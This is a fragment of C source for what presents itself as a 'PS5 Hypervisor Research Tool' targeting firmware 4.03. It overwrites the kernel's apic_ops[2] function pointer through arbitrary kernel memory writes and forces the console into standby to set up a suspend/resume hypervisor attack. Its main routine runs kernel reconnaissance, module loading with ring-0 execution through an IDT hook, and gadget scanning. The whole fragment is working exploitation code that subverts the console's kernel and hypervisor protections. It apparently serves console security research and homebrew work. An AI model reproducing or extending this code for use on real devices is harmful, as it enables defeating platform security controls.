                kernel_set_qaflags(qa_hook);
                printf("[+]\n");
                printf("[+] QA flags set with original xapic for restore.\n");

                /* Restore apic_ops[2] to original before entering rest
                 * mode.  During suspend, cpususpend_handler on secondary
                 * CPUs calls xapic_mode() via apic_ops[2].  The hooked
                 * target (KLD trampoline or ktext gadget) may not be
                 * safely callable from secondary CPUs during the suspend
                 * path (NPT execute permissions on KLD pages are not
                 * guaranteed for all CPUs).  Restoring the original
                 * prevents kernel panic during LAPIC suspend. */
                printf("[*] Restoring apic_ops[2] to original before rest mode...\n");
                kernel_copyin(&current_xapic,
                              g_dmap_base + hook_ops_pa + 0x10, 8);
                uint64_t restore_verify2 = 0;
                kernel_copyout(g_dmap_base + hook_ops_pa + 0x10,
                               &restore_verify2, 8);
                printf("    apic_ops[2] restored: 0x%016lx [%s]\n",
                       (unsigned long)restore_verify2,
                       restore_verify2 == current_xapic ? "OK" : "FAIL");

                /* Enter rest mode programmatically */
                printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
                fflush(stdout);
                fflush(stderr);
                notify("[HV Research] Entering rest mode in 3s...");
                sleep(3);
                int standby_ret2 = sceSystemStateMgrEnterStandby();
                printf("[*] sceSystemStateMgrEnterStandby() returned %d\n",
                       standby_ret2);
                if (standby_ret2 != 0) {
                    printf("[!] Standby failed (ret=%d). Manually enter rest mode.\n",
                           standby_ret2);
                    notify("[HV Research] Auto-standby failed! Manually enter rest mode.");
                }
            } else {
                printf("\n[-] Hook write verification failed.\n");
                printf("    apic_ops[2] NOT modified as expected.\n");
                notify("[HV Research] Phase 7: Hook write failed!");
            }
        }
    } else {
        printf("\n[-] No safe hook target found for apic_ops[2].\n");
        printf("    Need \"mov eax, 1; ret\" in ktext or KLD trampoline.\n");
        printf("[!] \"xor eax, eax; ret\" returns 0 — causes kernel panic!\n");
        printf("[!] LAPIC suspend requires xapic_mode() to return 1 (xAPIC).\n");
    }

    printf("\n");
    fflush(stdout);
}

/* ─── Main entry point ─── */

int main(void) {
    notify("[HV Research] main() entered");

    FILE *f = fopen("/data/etaHEN/hv_research.log", "w");
    if (f) {
        fclose(f);
        freopen("/data/etaHEN/hv_research.log", "w", stdout);
        freopen("/data/etaHEN/hv_research.log", "a", stderr);
        /* Force line-buffered so every \n flushes to disk immediately.
         * Without this, file-backed stdout is fully-buffered and a
         * crash/hang loses all unflushed printf output. */
        setvbuf(stdout, NULL, _IOLBF, 0);
        setvbuf(stderr, NULL, _IOLBF, 0);
    } else {
        notify("[HV Research] ERROR: fopen log failed!");
    }

    printf("\n");
    printf("==============================================\n");
    printf("  PS5 Hypervisor Research Tool\n");
    printf("  Target: FW 4.03 (educational/personal use)\n");
    printf("==============================================\n\n");
    fflush(stdout);

    notify("[HV Research] Starting...");

    /* Step 1: Initialize FW-specific offsets */
    if (init_fw_offsets() != 0) {
        printf("[-] Failed to initialize FW offsets\n");
        return 1;
    }

    /* Step 2: Discover DMAP base */
    if (discover_dmap_base() != 0) {
        printf("[-] Failed to discover DMAP base\n");
        printf("[!] Continuing without DMAP (limited functionality)\n");
    }

    /* Run research campaigns */
    campaign_kernel_recon();

    /* Campaign 7: kldload + ring-0 exec via IDT + ring-3 recon.
     * Loads .ko into kernel memory, scans for trampoline, invokes
     * hv_init via IDT hook, discovers apic_ops for Phase 9. */
    campaign_kmod_kldload();

    /* Phase 6: Flatz suspend/resume setup (XOTEXT clear + gadget scan) */
    if (g_dmap_base) {
        campaign_flatz_setup();
    }

    printf("\n==============================================\n");
    printf("  All campaigns complete.\n");
    printf("==============================================\n");

    fflush(stdout);
    fflush(stderr);

    notify("[HV Research] Done! Check /data/etaHEN/hv_research.log");

    return 0;
}
